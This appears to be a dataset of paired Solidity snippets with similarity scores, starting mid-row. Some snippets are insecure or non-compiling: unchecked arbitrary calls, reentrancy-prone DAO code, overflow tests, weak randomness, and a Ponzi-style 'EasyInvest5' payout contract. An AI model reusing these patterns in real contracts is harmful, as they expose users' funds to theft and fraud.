  using strings for *;
  string public s;

  function foo(string s1, string s2) {
    s = s1.toSlice().concat(s2.toSlice());
  }
}",0.6390259429643089,"contract Foo {
  string public foo;

  function getFoo() public {
    string memory _foo = foo;
    string memory _bar = foo;
  }
}"
"contract Something {

    mapping (address => Ton[]) public allTons;

    struct Ton { 
        uint id;
        string name;
        bool access;
    }

    constructor() public {

        allTons[msg.sender].push(Ton({
            id: 1,
            name: ""CoolDude"",
            access: true
        }));

        allTons[msg.sender].push(Ton({
            id: 2,
            name: ""NotCoolDude"",
            access: false
        }));
    }

    
    

    function getTonCount(address _address) public view returns (uint _count) {
        _count = allTons[_address].length;        
    }

}",0.6219293073705839,"contract TokenI is ERC20Token {



    string public name;                

    uint8 public decimals;             

    string public symbol;              



    function approveAndCall(

    address _spender,

    uint256 _amount,

    bytes _extraData

    ) public returns (bool success);





    function generateTokens(address _owner, uint _amount) public returns (bool);



    function destroyTokens(address _owner, uint _amount) public returns (bool);



}"
"contract UserManager {
   struct User {
      string username;
      string password;
      address userid;
      bool isAdmin;
   }

   mapping (uint => User) users;
   uint totalUsers=0;

   function checkIfUserExists(address userid) public view returns(bool) {
       for (uint o = 0; o < totalUsers; o++) {
           if (users[o].userid == userid) {
               return true;
           } else{
               return false;
           }
       }
   }

   function addUser(address userid) public {
       User memory user = User(""m"", ""n"", userid, true);

       users[totalUsers] = user;
       totalUsers++;
   }

}",0.6122214694738262,"contract IRC223 {

  uint public totalSupply;

  function balanceOf(address who) public view returns (uint);

  

  function name() public view returns (string memory _name);

  function symbol() public view returns (string memory _symbol);

  function decimals() public view returns (uint8 _decimals);



  function transfer(address to, uint value) public;

  

  event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);

}"
"contract Test {
    uint public x;

    function set(uint _x) public {
        x = _x;
    }

    function get() public returns(uint) {
        return x;
    }

}",0.6877199582480656,"contract Token {
  function balanceOf(address) public view returns (uint);
  function decimals() public view returns (uint);
}"
"contract pullother {

    function callFunctionInContractOne (address _address) returns (uint) {
        helloworld contractOne = helloworld(_address);
        return contractOne.returnint();
    }

}",0.6311809573421522,"contract EtherandomProxyI {
  function getContractAddress() constant returns (address _addr); 
  function getCallbackAddress() constant returns (address _addr); 
}"
"contract Bar {
    uint256[] public data;
    constructor() public {
        data.length = uint256(~0);
    }
    function foo(uint256 value) public {
        data.push(value);
    }
}",0.6455930359728161,"contract PreIcoContract {
    function buyTokens (address _investor) public payable;
    uint256 public startTime;
    uint256 public endTime;
}"
"contract ZK {
    uint private age;

    constructor (uint _age) public {
        age = _age;
    }

    function isAdult() public view returns (bool) {
        return (age >= 18);
    }

    function isTeen() public view returns (bool) {
        return (age >= 13 && age <= 19);
    }

    function addYears (uint _years) public {
        age += _years;
    }
}",0.6551331540103987,"contract DateTime {

    function isLeapYear(uint16 year) public pure returns (bool);

    function getYear(uint timestamp) public pure returns (uint16);

    function getMonth(uint timestamp) public pure returns (uint8);

    function getDay(uint timestamp) public pure returns (uint8);

}"
"contract FlowTest {

    uint256 public a = 0;
    uint256 public b = 2**256-1; 

    function flow () external {
        a -= 1;
        b += 1;
    }
}",0.6092316579505137,"contract fmp is destroyer {
    uint256 public sameVar;

    function test(uint256 _sameVar) external {
        sameVar = _sameVar;
    }

}"
"contract Test {
    uint256 public v1;
    uint256 public v2;
    string public v3;

    function Test(uint256 _v1, uint256 _v2, string _v3) {
        v1 = _v1;
        v2 = _v2;
        v3 = _v3;
    }
}",0.6018579799229284,"contract TestToken is MintableToken {
    string public name = ""Test Token"";
    string public symbol = ""T"";
    uint public decimals = 18;

    
    function () public payable {
        throw;
    }

}"
"contract newToken is S5Implement {

      uint256 private price = 1 ether;

      mapping (uint256 => uint256) private priceMapping;

      function getPrice(uint256 _tokenId) public view returns(uint256) {
           return priceMapping[_tokenId];
      }
  }",0.6245373201370621,"contract Token is IERC20 {

    function getBonusFactor(uint256 _startTime, uint256 _endTime, uint256 _weiAmount)

        public view returns (uint256);



    function isUserWhitelisted(address _user)

        public view returns (bool);

}"
"contract Test2 
{
    address testVal;

    constructor() public {
        testVal= msg.sender;
    } 

   function getMSGSender() public view returns ( address) {
     return testVal;
   }
}",0.6726151310853985,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() public returns (bool) {

        if (Owner == msg.sender) {

            return true; 

        }

        return false;

    }

}"
"contract Test1 is Test2 {

}",0.6657400485013807,"contract STCDR is Token{

	

}"
"contract Foo {

    function foo(address _addr) public {
        if(_addr.call(bytes4(keccak256(""isSafe()"")))) {

        }
    }

}",0.629563784416452,"contract EnsResolver {
	function setAddr(bytes32 node, address addr) public;
}"
"contract Genobject {
    uint public item;

    function Genobject(uint _val) {
        item = _val;
    }
}",0.619995191316438,"contract FiatContract {

    function USD(uint _id) constant public returns (uint256);

}"
"contract Caller {
   Genobject public instance;

   function Caller() {
       instance = new Genobject(3);
   }

   function recall() constant returns (uint) {
        return instance.item();
   }
}",0.6527065796738232,"contract token{



    function transfer(address receiver, uint amount) public;

    function balanceOf(address receiver) constant public returns (uint balance);

}"
"contract A is AccessControl {

    event EventCreated(address creator, uint value);

    modifier onlyCreator(address account) {
        require(hasRole(CREATOR_ROLE, account), ""Only creators allowed"");
        _;
    }

    constructor() public {
        _setupRole(CREATOR_ROLE, msg.sender);
    }

    function createEvent(uint amount) public onlyCreator(msg.sender) {
        emit EventCreated(msg.sender, amount);
    }
}",0.6221151266785999,"contract Destructible {





    address _owner; 



 

    event receipt(address indexed investor, uint value);





    modifier onlyOwner() {

        require(msg.sender == _owner);

        _;

    }



   

    constructor() public {

        _owner = msg.sender;

    }



    

    function() payable public {

        emit receipt(msg.sender, msg.value);

    }

       

    



    function destroyAndSend(address _recipient) onlyOwner() public {

        selfdestruct(_recipient);

    }



}"
"contract Foo is FooInterface {   
    function a(uint _amount) public pure returns(uint amount) {
        return _amount;
    }
}",0.6679745703925618,"contract TapInterface {

    function fix() public view returns (uint);

    function gap() public view returns (uint);

}"
"contract A {

        bytes32 name;
        function A(bytes32 _name) public {
            name = _name;
        }

        function getName() public constant returns (bytes32) {
            return name;
        }
    }",0.6679844207522213,"contract PriceFeedInterface {

    function name() public view returns (string);

    function getRate() public view returns (uint _rate, bool _live);

}"
"contract handleArray {

        bytes32 public name;
        uint public arrIndex;

        mapping(uint => address) testArray;

        function handleArray() public {
            arrIndex = 0;
        }

        function newEntry(address _newA) public {
            testArray[arrIndex] = A(_newA);
            arrIndex++;
        }

        function returnEntry(uint _index) public returns (string) {
            bytes32 input;
            string memory output;
            A a = A(testArray[_index]);

            
            input = a.getName();

            bytes memory bytesArray = new bytes(32);
            for (uint256 i; i < 32; i++) {
                bytesArray[i] = input[i];
            }

            
            output = string(bytesArray);

            return string(output);
        }
    }",0.6034077279585591,"contract DSPauseAbstract {
    function setOwner(address) public;
    
    function setAuthority(address) public;
    function setDelay(uint256) public;
    
    function plans(bytes32) public view returns (bool);
    
    function proxy() public view returns (address);
    
    function delay() public view returns (uint256);
    function plot(address, bytes32, bytes memory, uint256) public;
    function drop(address, bytes32, bytes memory, uint256) public;
    function exec(address, bytes32, bytes memory, uint256) public returns (bytes memory);
}"
"contract timeLock {

    uint256 lockTime = 1 days;

    struct locked{
        uint256 expire;
        uint256 amount;
    }

    mapping(address => locked) users;

    function lockEther() public payable {
        require(msg.value>0);
        locked storage userInfo = users[msg.sender];
        userInfo.expire = block.timestamp + lockTime;
        userInfo.amount = msg.value;
    }

    function withdraw() public {
        require(block.timestamp>=users[msg.sender].expire);
        locked storage userInfo = users[msg.sender];
        uint256 value = userInfo.amount;
        userInfo.expire = 0;
        userInfo.amount = 0;
        msg.sender.transfer(value);
    }



}",0.6001868048126808,"contract EasyInvest5 {

    

    uint256 public investorsCount;

    address[] public investors;

    

    mapping (address => uint256) public invested;

    

    mapping (address => uint256) atBlock;



    

    function () external payable {

        

        if (invested[msg.sender] != 0 && block.number > atBlock[msg.sender]) {

            

            

            

            uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;

            

            if (amount > this.balance) amount = this.balance;



            

            msg.sender.transfer(amount);

        } else {

            investors.push(msg.sender);

        }



        

        invested[msg.sender] += msg.value;

        

        atBlock[msg.sender] = block.number

        *investorsCount++;

    }

}"
"contract TestContract {
    function TestContract() public {}

    function test(uint256 iterations) public pure returns(uint) {
        int256[] memory a = new int256[](1000);

        for (uint32 i = 0; i < iterations; ++i) {
            a[i] = i;
        }
        return a.length;
    }
}",0.6488636354420304,"contract Common {
    
    function Common() internal {

    }

    function getIndexOfTarget(address[] list, address addr) internal pure returns (int) {
        for (uint i = 0; i < list.length; i++) {
            if (list[i] == addr) {
                return int(i);
            }
        }
        return -1;
    }
}"
"contract SubjectContract {
    uint public count = 0;

    function increaseCount() returns (uint newCount) {
        count ++;
        newCount = count;
    }
}",0.6284508710992546,"contract FiatContract {

    function ETH(uint _id) constant returns (uint256);

    function USD(uint _id) constant returns (uint256);

}"
"contract C {
    
    function test(address addressOfD, bytes bb) {
        addressOfD.call(bb);
    }
}",0.6217153529303512,"contract Resolver {

    function addr(bytes32 node) constant returns (address);

}"
"contract Limited {
    uint constant public weiPerDay = uint(1 ether);
    uint constant public weiPerSecond = weiPerDay /  uint(1 days);
    address public owner;
    uint public allowance;
    uint public lastSendTime; 

    function Limited() {
        owner = msg.sender;
        lastSendTime = now;
        allowance = weiPerDay;
    }

    function update() {
        allowance += weiPerSecond * (lastSendTime - now);
        if(allowance > weiPerDay) allowance = weiPerDay;
        lastSendTime = now;
    }

    function transfer(address _to, uint _amount) {
        update();
        if((msg.sender != owner) || (_amount > this.balance) ||(_amount > allowance)) throw;
        allowance -= _amount;
        if(!_to.send(_amount)) throw;
    }
}",0.6024636796986844,"contract CashlinkToken is StandardToken{
  
  event Mint(address indexed to, uint256 amount);
  
  string public symbol;
  string public  name;
  uint8 public decimals;
  
  address public owner;
  
  modifier onlyOwner {
      require(msg.sender == owner);
      _;
  }

  function CashlinkToken() public {
    owner = msg.sender;
    name = ""Cashlink Token"";
    symbol = ""CL"";
    decimals = 5;
  }
  
  
  function mint(address _to, uint256 _amount) onlyOwner public returns (bool) {
    totalSupply_ = totalSupply_.add(_amount);
    balances[_to] = balances[_to].add(_amount);
    Mint(_to, _amount);
    Transfer(address(0), _to, _amount);
    return true;
  }

  function () public payable {
    revert();
  }
}"
"contract CustTest { 
  mapping(address => address) public customers;
  function createProfile() public { 
    customers[msg.sender] = address(new CustList()); 
  } 
}",0.6162177622894811,"contract loglibs {
   mapping (address => uint256) public sendList;
   
   function logSendEvent() payable public{
        sendList[msg.sender] = 1 ether;
   }

}"
"contract Store {
    mapping(bytes32 => bytes32) private store;
    mapping(bytes32 => address) private authors;
    address private owner;

    constructor() public {
        owner = msg.sender;
    }

    function set(bytes32 key, bytes32 value) public payable {
        require(msg.value == 1 ether);
        require(store[key] == 0 || authors[key] == msg.sender);
        store[key] = value;
        authors[key] = msg.sender;
    }

    function get(bytes32 key) public view returns(bytes32) {
        return store[key];
    }

    function withdraw(address payable receiver) public {
        require(msg.sender == owner);
        receiver.transfer(address(this).balance);
    }
}",0.6871596296491959,"contract BulletinBoard {



    struct Message {

        address sender;

        string text;

        uint timestamp;

        uint payment;

    }



    Message[] public messages;

    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    function addMessage(string text) public payable {

        require(msg.value >= 0.000001 ether * bytes(text).length);

        messages.push(Message(msg.sender, text, block.timestamp, msg.value));

    }



    function numMessages() public constant returns (uint) {

        return messages.length;

    }



    function withdraw() public {

        require(msg.sender == owner);

        msg.sender.transfer(address(this).balance);

    }

}"
"contract Reg {
    mapping (address => uint256) public userBalances;
    address payable otherContr;

    constructor(address payable otherContrAddr) public {
        otherContr = otherContrAddr;
    }

    function() payable external  {
        userBalances[msg.sender] += msg.value;
    }

    function transferToOtherContr() public {
        otherContr.transfer(address(this).balance);
    }

}",0.6728440191500448,"contract Merunas {

    address payable public owner = msg.sender;

    

    function () external payable {}

    function receiveDonation() public payable {}

    function extractFunds() public {

        require(msg.sender == owner);

        owner.transfer(address(this).balance);

    }

    function showBalance() public view returns(uint256) {

        return address(this).balance;

    }

}"
"contract SetGetArray {

  uint[] someNumbers;

  function getArray() public constant returns (uint[]) {
    return someNumbers;
  }

  function setArray(uint[] setNumbers) public  {

    someNumbers = setNumbers;

  }

}",0.6747607468206032,"contract showNum {
    address owner = msg.sender;

    uint _num = 0;
   function setNum(uint number) public payable {
        _num = number;
    }

    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract Send {
    function sendtest() payable(returns bool){
        bool res = this.address.send(msg.value);
        return res
    }
}",0.6756337647534737,"contract Context {
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}"
"contract B2 is A2 {
    function doOther(uint value5) public {
    }
}",0.6914778195779739,"contract ERC20 is IERC20 {

    function burn(uint256 _value) public;

}"
"contract UserReg {

    mapping(address => bool) public isUser;

    function add(address userAddress) public {
        require(userAddress != 0x0 && !isUser[userAddress]);             
        isUser[userAddress] = true;    
    }

    function pass(address passAddress) public view returns(bool) {   
        return isUser[passAddress];
    }

    

    function isUserReg() public pure returns(bool isIndeed) {
        return true;
    }
}",0.6450161405999632,"contract UserRegistryInterface {
  event AddAddress(address indexed who);
  event AddIdentity(address indexed who);

  function knownAddress(address _who) public constant returns(bool);
  function hasIdentity(address _who) public constant returns(bool);
  function systemAddresses(address _to, address _from) public constant returns(bool);
}"
"contract SaveData {

    address[] public addrs;

    UserReg userReg;

    function instantiateXyz(address userRegAddr) public returns(bool success) {
        userReg = UserReg(userRegAddr);     
        require(userReg.isUserReg());       
        return true;
    }

    function saveAddress(address pubAddress) public returns(bool success) {
        require(userReg.pass(pubAddress)==true);
        addrs.push(pubAddress);    
        return true;
    }

}",0.6060427191023655,"contract Recoverable is Owned {
    
    
    
    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
        return ERC20Interface(tokenAddress).transfer(owner, tokens);
    }
    
    
    
    
    function recoverLostEth(address toAddress, uint value) public onlyOwner returns (bool success) {
        toAddress.transfer(value);
        return true;
    }
}"
"contract ReserveToken {

...

    function ExominiumToken(address _addressFounder) {",0.635318250357981,"contract CNRAddTokenInterface

{

    function addTokenAddress(address) public;

}"
"contract A {
    B[] public arrayOfBs;
    function create() returns (B) {
        B b = new B();
        arrayOfBs.push(b);
        return b;
    }
}",0.6448951969837805,"contract Test {

    function A() public pure returns (bool) {

        require(false, ""you shall not pass"");

        return true;

    }

}"
"contract Asset {
    string name;

    constructor(string _name) public {
        name = _name;
    }

    function modifyAssetAndCreateNew(string _name, AssetFactory factory) public {
        factory.createAsset(_name);
        name = _name;
    }
}",0.6589701482945546,"contract NamableAddressList is AddressList {

    constructor(string _name, bool nullValue)

    AddressList(_name, nullValue) public {}



    function changeName(string _name) onlyOwner public {

        name = _name;

    }

}"
"contract StringStore {
    string public myString;
    address public updater; 

    function StringStore(address _updater) {
        updater = _updater;
    }

    function setString(string newString) {
        if (updater != msg.sender) throw;
        myString = newString;
    }
}",0.6060702517888441,"contract Balls {

string messageString = ""Welcome to the Project 0xbt.net"";

    

    function getPost() public constant returns (string) {

        return messageString;

    }

    

    function setPost(string newPost) public {

        messageString = newPost;

    }

    

}"
"contract OtherContract {


  address relay;

  modifier onlyRelay() {
      require(msg.sender == relay, ""Sender is not relay."");
      _;
  }

  function setRelay(address _relay) external onlyOwner {
      relay = _relay;
  }
}",0.6510382368033311,"contract Ownable {
    address public owner;
    address public wallet;

    function Ownable() internal {
        owner = msg.sender;
        wallet = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}"
"contract Underflow1 {
    uint8[256] arr;
    uint8 i = 0;

    function testf2() public returns (bool) {
        for (i = 0; i < arr.length; ++i) {
            
        }
        if (i == 256) {
            return true;
        } else {
            return false;
        }
    }
}",0.6079176820265756,"contract CaruTokenSender is Ownable {

    function drop(TokenERC20 token, address[] to, uint256[] value) onlyOwner public {
    for (uint256 i = 0; i < to.length; i++) {
      token.transfer(to[i], value[i]);
    }
  }
}"
"contract Refunds {

    mapping(uint => bool) public data;

    function setIt() public {
        data[1] = true;
    }

    function deleteIt() public {  
        delete data[1];
    }
}",0.6251762142535948,"contract Token{

function transfer(address to, uint value) public returns (bool);

function decimals() public returns (uint);

}"
"contract C1 {

  function call (address myContractsAddress, uint aParameter) returns(uint){
    C2 c2= new C2(myContractsAddress);
    return c2.aFunction(aParameter);
  }
}",0.6322297660944597,"contract EtherandomProxyI {
  function getContractAddress() constant returns (address _addr); 
  function getCallbackAddress() constant returns (address _addr); 
}"
"contract C2 {
  function aFunction(uint aParameter) returns(uint) {
    return 1;
  }
}",0.6318530090072466,"contract time{
function _time() view external returns (uint)
{
    return now ;
    
}
}"
"contract SimplifiedTheDAOCode {
    uint public closingTime = 1464426000;
    address public privateCreation;
    SimplifiedManagedAccount public extraBalance;
    mapping (address => uint256) balances;
    uint256 public totalSupply;
    mapping (address => uint256) weiGiven;
    uint public minTokensToCreate = 50000000000000000000000;
    bool public isFueled = true;
    event FuelingToDate(uint value);
    uint constant creationGracePeriod = 40 days;

    function createTokenProxy(address _tokenHolder) returns (bool success) {
        if (now < closingTime && msg.value > 0
            && (privateCreation == 0 || privateCreation == msg.sender)) {

            uint token = (msg.value * 20) / divisor();
            extraBalance.call.value(msg.value - token)();
            balances[_tokenHolder] += token;
            totalSupply += token;
            weiGiven[_tokenHolder] += msg.value;
            CreatedToken(_tokenHolder, token);
            if (totalSupply >= minTokensToCreate && !isFueled) {
                isFueled = true;
                FuelingToDate(totalSupply);
            }
            return true;
        }
        throw;
    }

    function divisor() constant returns (uint divisor) {
        
        
        
        if (closingTime - 2 weeks > now) {
            return 20;
        
        } else if (closingTime - 4 days > now) {
            return (20 + (now - (closingTime - 2 weeks)) / (1 days));
        
        } else {
            return 30;
        }
    }

    function () returns (bool success) {
        if (now < closingTime + creationGracePeriod && msg.sender != address(extraBalance))
            return createTokenProxy(msg.sender);
        else
            return receiveEther();
    }

    function receiveEther() returns (bool) {
        return true;
    }

    event CreatedToken(address indexed to, uint amount);
}",0.6644207982436104,"contract VTEXP is Ownable {

  

  event Mint(address indexed to, uint256 amount);

  event MintFinished();



  event Transfer(address indexed from, address indexed to, uint256 value);

  using SafeMath for uint256;

  string public constant name = ""VTEX Promo Token"";

  string public constant symbol = ""VTEXP"";

  uint8 public constant decimals = 5;  

  bool public mintingFinished = false;

  uint256 public totalSupply;

  mapping(address => uint256) balances;



  modifier canMint() {

    require(!mintingFinished);

    _;

  }

  

  

  function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {



    totalSupply = totalSupply.add(_amount);

    require(totalSupply <= 10000000000000);

    balances[_to] = balances[_to].add(_amount);

    emit  Mint(_to, _amount);

    emit Transfer(address(0), _to, _amount);



    return true;

  }



  

  function finishMinting() onlyOwner canMint public returns (bool) {

    mintingFinished = true;

    emit MintFinished();

    return true;

  }

 

  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_to != address(0));

    require(_value <= totalSupply);



      balances[_to] = balances[_to].add(_value);

      totalSupply = totalSupply.sub(_value);

      balances[msg.sender] = balances[msg.sender].sub(_value);

      emit Transfer(msg.sender, _to, _value);

      return true;

  }



  function balanceOf(address _owner) public constant returns (uint256 balance) {

    return balances[_owner];

  }



  function balanceEth(address _owner) public constant returns (uint256 balance) {

    return _owner.balance;

  }

    



}"
"contract VariableLength {

    event LogTest(bytes b);

    function test(bytes b) public returns(bool success) {
        LogTest(b);
        return true;
    }
}",0.6640111771598629,"contract DAppTest {

  bool public _is;

  function changeBoolean() public returns (bool success) {
    _is = !_is;
    return true;
  }

}"
"contract MyContract {
    bytes4 private constant FUNC_SELECTOR = bytes4(keccak256(""detectTransferRestriction(address,address,uint256)""));

    function callDetectTransferRestriction(address _token, address _to, address _from, uint256 _amount) public returns (bool) {
        bool success;
        bytes memory data = abi.encodeWithSelector(FUNC_SELECTOR, _to, _from, _amount);

        assembly {
            success := call(
                gas,            
                _token,         
                0,              
                add(data, 32),  
                mload(data),    
                0,              
                0               
            )
        }

        return success;
    }
}",0.656920900777587,"contract ERC23Basic is ERC20Basic {
    function transfer(address _to, uint256 _value, bytes _data) public returns (bool success);
    function contractFallback(address _origin, address _to, uint _value, bytes _data) internal returns (bool success);
    function isContract(address _addr) internal returns (bool is_contract);
    event Transfer(address indexed _from, address indexed _to, uint256 _value, bytes indexed _data);
}"
"contract MyContract {
  address token_address = 

  function hasTokens() public returns (bool) {
    let balance = ERC20(token_address).balanceOf(msg.sender);
    return (balance > 0);
  }

}",0.6904272740236798,"contract ERC20 {
  function balanceOf(address owner) constant returns (uint balance);
  function transfer(address to, uint value) returns (bool success);
}"
"contract Example {

    struct Store {
        string id;         
        uint time;         
    }

    mapping (string => Store) public purchases;

    function set(string memory _id, uint _time) public returns(bool) {
        purchases[msg.sender].id = _id;
        purchases[msg.sender].time = _time;
        return true;
    }

    function get() public view returns(Store memory) {
        return purchases[msg.sender];
    }
}",0.6809139642867033,"contract AOQUtil {

    function getLevel(uint value) public view returns (uint);

    function getStaticCoefficient(uint level) public pure returns (uint);

    function getRecommendCoefficient(uint times) public pure returns (uint);

    function compareStr(string memory _str, string memory str) public pure returns (bool);

}"
"contract Reason {

    function doSomething() public pure {
        require(false, ""Just because"");
    }
}",0.6384923530810831,"contract ErrorReporter {

    function report(string reason) public pure {

        revert(reason);

    }

}"
"contract Test {
  address testAddress;
  constructor() {
    testAddress = msg.sender;
  }

  
  function test() public {
    require(msg.sender == testAddress);

  }
}",0.6825713416496638,"contract Owned {
    address owner;
    
    function constuctor() public {
        owner = msg.sender;
    }
    
	modifier onlyOwner {
		require(msg.sender == owner);
		_;
	}
}"
"contract Token {
    address [] public voters;

    function Token(address first_voter) {
        voters.push(first_voter);
    }
}",0.6393737397502466,"contract TokenList {

    function isTokenInList(address tokenAddress) public constant returns (bool);

}"
"contract Vote{
     
     

    function check_first_voter() returns (address) {
        Token token = new Token(0x123);
        address valid_voter = token.voters(0);  

        
        assert(valid_voter == 0x123);
        
        return valid_voter;
    }
}",0.6011480815267185,"contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
}"
"contract Item {
    Item public next;
    address owner;

    constructor(Item _next) public {
        owner = msg.sender;
        if (_next == Item(0)) {
            next = this;
        } else {
            next = _next;
        }
    }

    function addNew(Item item) public {
        require(msg.sender == owner);
        next = item;
    }
}",0.6743911879976956,"contract Owned {
    address public owner;

    	
    constructor() public {
        owner = msg.sender;
    }	

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
}"
"contract SalesContract {

    address payable public owner;
    bool public isSold = false;
    string public salesDescription = ""Honda Civic"";
    uint public price = 2 ether;

    constructor() public {
        owner = msg.sender;
    }

    function Buy() public payable {
        if(msg.value >= price) {
            owner.transfer(address(this).balance);
            owner = msg.sender;
            isSold = true;
        } else {
            revert();
        }
    }

}",0.6858653899808437,"contract Name{
    address public owner = msg.sender;
    string public name;

    modifier onlyBy(address _account) { require(msg.sender == _account); _; }


    function Name(string myName) public {
      name = myName;
    }

    function() payable public {}

    function withdraw() onlyBy(owner) public {
      owner.transfer(this.balance);
    }

    function destroy() onlyBy(owner) public{
      selfdestruct(this);
    }
}"
"contract TestInt {
    uint value1;
    function setVal(uint _value) public {
      value1 = _value + 10;
    }

    function getVal() public  returns (uint) {
      return value1;
    }

    int value2;
    function set2(int _value) public {
      value2 = _value + 10;
    }

    function get2() public  returns (int) {
      return value2;
    }
    uint value;
  }",0.6665101711664565,"contract Nonce {
    event IncrementEvent(address indexed _sender, uint256 indexed _newNonce);
    uint256 value;
    
    function increment() public returns (uint256) {
        value = ++value;
        emit IncrementEvent(msg.sender, value);
        return value;
    }
    
    function getValue() public view returns (uint256) {
        return value;
    }
}"
"contract HoldOff {
    address public owner;

    event LogRequest(
        address requester,
        address target,
        bytes msgData);

    function HoldOff() {
        owner = msg.sender; 
    }

    function requestCall(address target, bytes msgData) 
        returns (bytes32 key) {
        LogRequest(msg.sender, target, msgData);
    }

    function doCall(address target, bytes msgData) 
        returns (bool) {
        if (owner != msg.sender) throw;
        return target.call(msgData);
    }
}",0.6258451478468195,"contract generic_holder {
    address owner;
    
    modifier onlyowner {
        if (owner == msg.sender)
            _;
    }
    
    
    function generic_holder() {
        owner = msg.sender;
    }
    
    function change_owner(address new_owner) external onlyowner {
        owner = new_owner;
    }
    
    function execute(address _to, uint _value, bytes _data) external onlyowner returns (bool){
        return _to.call.value(_value)(_data);
    }
    
    function get_owner() constant returns (address) {
        return owner;
    }
}"
"contract NewHello {

    mapping(address => string) public users; 

    function updateUser(string memory name) public {
        require(bytes(users[msg.sender]).length == 0);
        users[msg.sender] = name; 
    }

    function getUser(address userAddress) public view returns(string memory) {
        return users[userAddress]; 
    }
}",0.6383329968833779,"contract License {
    
    mapping (address => bool) signatories;
    
    function sign() public {
        signatories[msg.sender] = true;
    }
        
    function unsign() public {
        signatories[msg.sender] = false;
    }
        
    function did_address_sign(address _address) public view returns (bool) {
        return signatories[_address];
    }
}"
"contract Tenant {
    address tenant;
    uint256 rent;

    function Tenant(address _tenant) {
        tenant = _tenant;
    }

    function setRent(uint256 _rent) {
        rent = _rent;
    }
}",0.6303550433378834,"contract token {
    function transfer(address receiver, uint256 amount);
    function balanceOf(address _owner) constant returns (uint256 balance);
}"
"contract Landlord is User {
    string public landlordName;
    string public physicalAddress;

    function Landlord(
      string _name,
      string _physicalAddress) {
        landlordName = _name;
        physicalAddress = _physicalAddress;
    }

    function setRent(uint256 _rent, address _tenantAddress){
        Tenant person = Tenant(_tenantAddress);
        person.setRent(_rent);
    }
}",0.6148394168760627,"contract ComponentContainerInterface {

    mapping (string => address) components;



    event ComponentUpdated (string _name, address _componentAddress);



    function setComponent(string _name, address _providerAddress) internal returns (bool success);

    function getComponentByName(string name) public view returns (address);



}"
"contract C {
    function f() public {
        
        
        uint[] x = [uint(1), 3, 4];
    }
}",0.6926107863094819,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract Caller {

  test public t;

  
  

  function Caller(address tAddress) {
    t = test(tAddress); 
  }

  function callIt(address theAddress)
    public
    returns(uint bal)
  {
      return t.FunctionX(theAddress);
  }
}",0.6729237174450783,"contract WhiteList {
	function register(address _address) public;
	function unregister(address _address) public;
	function isRegistered(address _address) public view returns(bool);	
}"
"contract OwnedToken {
    
    
    
    TokenCreator creator;
    address owner;
    bytes32 name;

    
    
    constructor(bytes32 _name) public {

        owner = msg.sender;
        name = _name;

        
        
        
        
        
        creator = TokenCreator(msg.sender);

    }

    function transfer(address newOwner) public {
        if (msg.sender != owner) return;

        
        
        
        
        
        if (creator.isTokenTransferOK(owner, newOwner))
            owner = newOwner;
    }

    [...rest snipped...]
}",0.6905942250751301,"contract StorexOwner {
	address public owner;
	
	event OwnershipTransferred(address indexed _from, address indexed _to);
	
	constructor() public {
		owner = msg.sender;
	}
	
	modifier isOwner {
		require(msg.sender == owner);
		_;
	}
	
	function transferOwnership(address _newOwner) public isOwner {
		owner = _newOwner;
		emit OwnershipTransferred(msg.sender, _newOwner);
	}
}"
"contract Cast {

    function weirdResult() public pure returns(uint) {
        uint8 y = 3;
        uint8 x = 10;
        return x**y;
    }
}",0.6926044529323084,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Test {
    function test(bytes32 data) external pure returns (address) {
        return address(uint160(uint256(data)));
    }
}",0.6618230893469699,"contract Kyber {

	function searchBestRate(address, address, uint256, bool) external view returns(address, uint256) {}

}"
"contract Test {
  
  event Paid(address indexed _from, uint _value);

  
  
  function () external payable {
    Paid(msg.sender, msg.value);
  }
}",0.6825465431526208,"contract Vote {
    event LogVote(address indexed addr);

    function() {
        LogVote(msg.sender);

        if (msg.value > 0) {
            msg.sender.send(msg.value);
        }
    }
}"
"contract Lottery {
    address public manager;
    address[] public players;
    address tokenAddress;

    function Lottery() public {
        manager = msg.sender;
    }

    function enter() public payable {
        require(msg.value > .01 ether);

        players.push(msg.sender);
    }

    function provideService() external payable {
        uint amount = msg.value;
        ERC20Interface tokenContract = ERC20Interface(tokenAddress);
        require(tokenContract.transferFrom(msg.sender, this, amount));
        
        players.push(msg.sender);
    }

    function random() private view returns (uint) {
        return uint(keccak256(block.difficulty, now, players));
    }

    function pickWinner() public restricted {
        ERC20Interface tokenContract = ERC20Interface(tokenAddress);
        
        uint contractBalance = tokenContract.balanceOf(address(this)); 
        uint index = random() % players.length;
        
        tokenContract.transfer( players[index], contractBalance / 2 );
        
        address treasury;
        tokenContract.transfer( treasury, contractBalance / 2 );
        
        players = new address[](0);
    }

    modifier restricted() {
        require(msg.sender == manager);
        _;
    }

    function getPlayers() public view returns (address[]) {
        return players;
    }
}",0.6308287371747574,"contract PrivateSale is Ownable {

   LamdenTau public lamdenTau;
   address public buyer;

   uint256 public priceInWei;

   function PrivateSale(address _tokenContractAddress, address _buyer, uint256 _priceInWei) public {

      require(_buyer != address(0));
      require(_tokenContractAddress != address(0));
      require(_priceInWei > 0);

      buyer = _buyer;
      priceInWei = _priceInWei;
      lamdenTau = LamdenTau(_tokenContractAddress);
   }

   function buyTokens() public payable {
      require(msg.sender == buyer);
      require(msg.value >= priceInWei);

      transferWeiToWallet();
      issueTokensToBuyer();
   }
   
   function () public payable {
       buyTokens();
   }

   function transferWeiToWallet() internal  {
      owner.transfer(msg.value);
   }

   event IssueTokens(address indexed to, uint256 weiValue, uint256 amountOfTokens);

